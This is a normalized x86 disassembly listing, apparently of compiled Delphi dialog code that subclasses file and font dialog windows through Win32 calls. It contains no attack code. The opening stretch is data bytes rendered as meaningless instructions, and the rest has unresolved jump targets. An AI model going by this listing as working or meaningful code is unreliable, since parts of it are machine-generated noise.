out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
inc eax
add [ eax + 0x438f ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
pop [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x438f 0x0
pop eax
add [ eax ] al
add [ esp + eax * 4 - 0x16ebffbd ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] al
xchg ebp eax
inc ebx
add [ eax + 0x36 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ esp + edx * 4 + 0x6b680043 ] ah
jo r-xdata
pcmpgtd mm6 [ edx + 0x48 ]
imul esp [ ebp + 0x4d ] 0x68637461
inc ebx
popad
imul ebp [ esi + 0x64 ] 0x7478654e
jb r-xdata
inc ebx
add [ edx + eax - 0x7b6c0000 ] ch
inc ebx
add [ ecx + ebp * 8 ] dl
popad
arpl [ ebp + 0xc ] sp
jb r-xdata
insb
pcmpgtd mm6 [ edx + 0x48 ]
imul esp [ ebp + 0x57 ] 0x656c6f68
push edi
outsd
jb r-xdata
add [ eax + edx * 4 ] cl
je r-xdata
add [ eax + 0x4391 ] ch
jo r-xdata
insb
insb
or esp [ esi + 0x72 ]
push edi
push 0x57656c6f
outsd
jb r-xdata
or al 0x66
jb r-xdata
popad
jae r-xdata
outsd
ja r-xdata
jae r-xdata
jo r-xdata
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
adc al 0xe9
popad
arpl [ ebp + 0x41 ] sp
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] al
xchg ebp eax
inc ebx
add [ eax + 0x36 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x55 ] bh
inc ebx
add [ eax + 0x6b ] ch
inc ecx
add [ 0x6a840041 ] bl
inc ecx
add ah dh
in eax 0x41
add al al
in al 0x41
add [ esi ] al
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add ah cl
stosb [ edi ]
inc ebx
add [ ebp + edx * 4 - 0x527bffbd ] al
inc ebx
add al dl
xchg ebp eax
inc ebx
add [ eax ] cl
lodsb [ esi ]
inc ebx
add [ edx ] al
add ch ch
or ah [ esi + 0x72 ]
push ebx
push 0x6548776f
outsd
jb r-xdata
imul esp [ ebp + 0x55 ] 0x776f4470
outsb
inc esp
imul esp [ ecx + 0x6c ] 0x8d73676f
inc eax
add al ch
nop
adc ah [ esi + 0x72 ]
inc esp
imul esi [ ebx + 0x61 ] 0x4d656c62
popad
je r-xdata
bound ebp [ ebp + 0x57 ]
or ah [ esi + 0x72 ]
inc ebx
add [ esi ] al
jb r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
imul esp [ ecx + 0x6c ] 0x8fe0676f
inc ebx
add [ edi ] al
adc edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x65537265
je r-xdata
or al 0x54
inc esi
imul ebp [ esi + 0x64 ] 0x6974704f
outsd
outsb
jae r-xdata
lea eax [ eax ]
call 0x643d479
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x69ffbc6f ] cl
xchg ecx eax
add [ eax ] al
or [ esi + 0x72 ] esp
outsd
ja r-xdata
push 0x65736143
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x90
inc ebx
inc ebx
add [ esi ] al
push 0x65736143
pcmpgtd mm6 [ edx + 0x44 ]
imul esi [ ebx + 0x61 ] 0x55656c62
push ebp
jo r-xdata
jo r-xdata
jo r-xdata
insb
pop es
outsd
ja r-xdata
push edx
jo r-xdata
or [ fs : esi + 0x72 ] esp
outsd
ja r-xdata
inc esi
imul esp [ ecx + 0x6c ] 0x8f88676f
inc ebx
add [ eax - 0x7b ] dl
inc ebx
add [ esi ] al
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ ebp - 0x6fefffc0 ] cl
inc ebx
add [ ebx ] al
or edx [ esi + eax * 2 + 0x69 ]
outsb
dec edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x91
inc ebx
push 0x57656c6f
adc ah [ esi + 0x72 ]
inc esp
imul esi [ ebx + 0x61 ] 0x57656c62
insb
or esp [ esi + 0x72 ]
dec ebp
popad
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x55 ]
add [ eax + eax ] cl
add [ eax ] al
or al 0x90
imul ebp [ edi + 0x6e ] 0x1
sub_439340
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45fa78
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_45c0c4
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_45c0c4
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_45f7ac
mov edi eax
mov eax ebx
call sub_45f790
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_45f778
mov edi eax
mov eax ebx
call sub_45f7c4
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_4393f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_439340
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_43945c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e1a4
mov [ esi + 0x30 ] 0x1
push esi
push sub_439538
call sub_41f228
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4394a4
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e1f0
test bl bl
jle r-xdata
call sub_41f2c0
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_4394d8
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_4623a8
mov cl 0x1
sub_439500
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_403910
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_439538
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_439562
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4395d0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_458ee8
mov [ ebp - 0x14 ] eax
call sub_458e04
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_439693
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_461cd0
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_439665
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43966c
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_461d2c
retn
sub_43966c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43969a
mov eax [ ebp - 0x14 ]
call sub_458f9c
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_458e0c
retn
sub_4396cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x110
jne r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x3c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push esi
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
push edi
mov eax [ ebp + 0x10 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
cmp [ edi + 0x8 ] 0xfffffda7
jne r-xdata
push 0xfffffff8
push esi
call GetWindowLongA
call sub_439340
sub_439750
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43945c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x58 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x5c ] eax
mov al [ r-xdata ]
mov [ esi + 0xb0 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x7c ] eax
mov [ esi + 0x64 ] 0x1
mov [ esi + 0x80 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4397c9
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x7c ]
call sub_4036c0
mov eax [ esi + 0x58 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4394a4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_439804
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_439e8c
mov eax edi
mov si 0xffed
call sub_4038bc
mov ebx eax
mov eax [ edi + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_43982c
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx ]
cmp eax 0x110
jne r-xdata
cmp eax 0x4e
jne r-xdata
test [ edi + 0x5e ] 0x1
je r-xdata
mov edx ebx
mov eax edi
call sub_439584
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
add eax 0x260
cmp eax 0x7
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_439870 ]
mov edx [ esi + 0xc ]
mov eax edi
call sub_439804
test al al
jne r-xdata
mov eax edi
mov si 0xffee
call sub_4038bc
jmp r-xdata
mov eax edi
mov si 0xffec
call sub_4038bc
jmp r-xdata
mov eax edi
mov si 0xffeb
call sub_4038bc
jmp r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
cmp eax [ edi + 0x68 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov [ ebx + 0xc ] eax
push eax
push 0x0
mov eax [ edi + 0x3c ]
push eax
call SetWindowLongA
jmp r-xdata
mov [ edi + 0x68 ] eax
mov eax edi
mov si 0xffea
call sub_4038bc
jmp r-xdata
mov [ esp ] 0x1
mov ecx esp
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax edi
mov si 0xffe9
call sub_4038bc
xor eax eax
mov al [ esp ]
mov [ ebx + 0xc ] eax
sub_439928
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_4399b0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4399e2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xchg edx eax
call sub_41a6f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4399e9
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_4399ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41e51c
push ebx
push sub_4399b0
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_439a30
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40442c
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov ecx r-xdata
mov edx esi
call sub_404730
mov eax [ ebx ]
call sub_4048dc
mov dl 0x7c
call sub_40ccd0
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
mov dl 0x7c
call sub_40ccd0
test eax eax
jne r-xdata
sub_439a80
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_439d31
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0x68 ]
xor ecx ecx
mov edx 0x58
call sub_402fc4
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
mov [ ebp - 0x68 ] 0x4c
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
mov [ ebp - 0x68 ] 0x58
jmp r-xdata
mov [ ebp - 0x48 ] 0x104
mov [ ebp - 0x48 ] 0xffef
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x60 ]
call sub_439a30
mov eax [ ebp - 0x8 ]
call sub_4048dc
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x68 ] eax
test [ ebx + 0x5c ] 0x40
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_4048dc
mov [ ebp - 0x3c ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x2
lea eax [ ebp - 0xc ]
call sub_404a68
mov eax [ ebp - 0xc ]
call sub_4048dc
mov esi eax
mov [ ebp - 0x4c ] esi
mov edx [ ebp - 0x48 ]
add edx 0x2
mov eax esi
xor ecx ecx
call sub_402fc4
mov eax [ ebx + 0x78 ]
call sub_4048dc
mov edx eax
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x4c ]
call sub_409020
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5c ] edx
mov eax r-xdata
mov [ ebp - 0x3c ] eax
jmp r-xdata
inc eax
add esi 0x4
cmp al 0x16
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x34 ] edx
mov eax [ ebx + 0x70 ]
call sub_4048dc
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x20
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov esi rw-data
mov edx eax
cmp dl 0x1f
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ ebp - 0x34 ] 0xfff7ffff
xor [ ebp - 0x34 ] 0x80000
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x32 ] 0x8
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_4048dc
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x78 ]
call sub_408ed4
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_40497c
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x74 ]
call sub_4044c4
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x24 ] sub_4393f4
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0xb0 ] edx
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x24 ] sub_4396cc
inc eax
add esi 0x4
cmp al 0x1
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov esi eax
test esi esi
je r-xdata
or [ ebp - 0x34 ] 0x40
mov [ ebp - 0x20 ] eax
mov edx eax
cmp dl 0x7
ja r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439d38
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404450
retn
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_439e8c
test [ ebp - 0x33 ] 0x4
je r-xdata
and [ ebx + 0x5c ] 0xffffff7f
or [ ebx + 0x5c ] 0x80
jmp r-xdata
and [ ebx + 0x5c ] 0xfffffffe
or [ ebx + 0x5c ] 0x1
jmp r-xdata
test [ ebp - 0x34 ] 0x1
je r-xdata
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x64 ] eax
sub_439d44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x1 ]
mov eax esi
call sub_40ccd0
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebx
sub ecx esi
mov eax edi
mov edx esi
call sub_40451c
inc ebx
mov eax edi
mov edx esi
call sub_40461c
mov eax esi
call sub_408fa8
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_439d8c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_439e71
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_439d44
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_439d44
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_408e1c
cmp [ eax ] 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4046ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439e78
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_439d44
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4046e4
cmp eax 0x3
jle r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404730
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2 ] 0x5c
je r-xdata
sub_439e8c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_439f37
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5e ] 0x1
jne r-xdata
push ebp
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
add edx 0x78
call sub_439d44
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push ebp
mov eax [ edx + 0x1c ]
call sub_439d8c
pop ecx
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x78
call sub_404480
jmp r-xdata
mov [ ebp - 0x1 ] 0x20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439f3e
lea eax [ ebp - 0xc ]
call sub_40442c
retn
sub_439f44
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
push 0x0
push esi
xor ecx ecx
xor edx edx
xor eax eax
call sub_414b64
test [ ebx + 0x5e ] 0x1
jne r-xdata
push esi
push edi
call GetClientRect
jmp r-xdata
push esi
push 0x45f
push edi
call GetDlgItem
push eax
call GetWindowRect
push 0x2
push esi
mov eax [ ebx + 0x3c ]
push eax
push 0x0
call MapWindowPoints
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_439f98
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_404480
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax esp
push eax
push 0x105
push 0x465
mov eax [ ebx + 0x3c ]
push eax
call GetParent
push eax
call SendMessageA
mov edx esi
mov eax esp
call sub_4091b4
jmp r-xdata
add esp 0x108
pop esi
pop ebx
retn
sub_43a000
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax esi
call sub_4046e4
mov ebx eax
cmp ebx 0x1
jle r-xdata
lea eax [ edi + 0x6c ]
push eax
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_40493c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40cacc
test al al
je r-xdata
mov ecx ebx
dec ecx
mov edx esi
mov eax r-xdata
call sub_40cb00
test al al
jne r-xdata
dec ebx
sub_43a0a4
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax 0x111
jne r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
push eax
push edx
call sub_4393f4
cmp [ ebp + 0x10 ] 0x402
jne r-xdata
cmp [ ebp + 0x12 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_43a1b8
mov eax 0x1
jmp r-xdata
pop ebp
retn 0x10
sub_43a0e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43945c
mov dl 0x1
mov eax [ r-xdata ]
call sub_421340
mov [ esi + 0x58 ] eax
mov ax [ r-xdata ]
mov [ esi + 0x5d ] ax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_43a13a
add [ eax ] al
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x58 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4394a4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_43a16c
cmp [ edx ] 0x111
jne r-xdata
call sub_439584
retn
cmp [ edx + 0x6 ] 0x9
jne r-xdata
mov cx [ edx + 0x4 ]
cmp cx 0x473
jne r-xdata
cmp cx 0x474
jne r-xdata
mov [ eax + 0x71 ] 0x1
jmp r-xdata
mov [ eax + 0x70 ] 0x1
sub_43a1b8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x40 ]
push eax
push 0x0
push 0x401
push ebx
call SendMessageA
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_43a420
push 0x0
push 0x0
push 0x147
push 0x473
push ebx
call SendDlgItemMessageA
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
push ebp
push sub_43a243
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffed
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x0
push esi
push 0x150
push 0x473
push ebx
call SendDlgItemMessageA
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_421514
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a264
push ebp
mov ebp esp
add esp 0xffffff7c
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x84 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43a3fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x44 ] 0x3c
xor eax eax
mov [ ebp - 0x3c ] eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x80 ]
push eax
push 0x3c
mov eax [ ebx + 0x58 ]
call sub_421528
push eax
call GetObjectA
lea eax [ ebp - 0x8 ]
lea edx [ ebp - 0x64 ]
mov ecx 0x20
call sub_404694
xor eax eax
mov al [ ebx + 0x5c ]
mov eax [ eax * 4 + rw-data ]
or eax 0x48
mov [ ebp - 0x30 ] eax
xor eax eax
mov esi rw-data
call sub_42c008
call sub_42bb1c
mov [ ebp - 0x3c ] eax
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5d ] edx
inc eax
add esi 0x4
cmp al 0x10
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x30 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov eax [ ebx + 0x44 ]
test eax eax
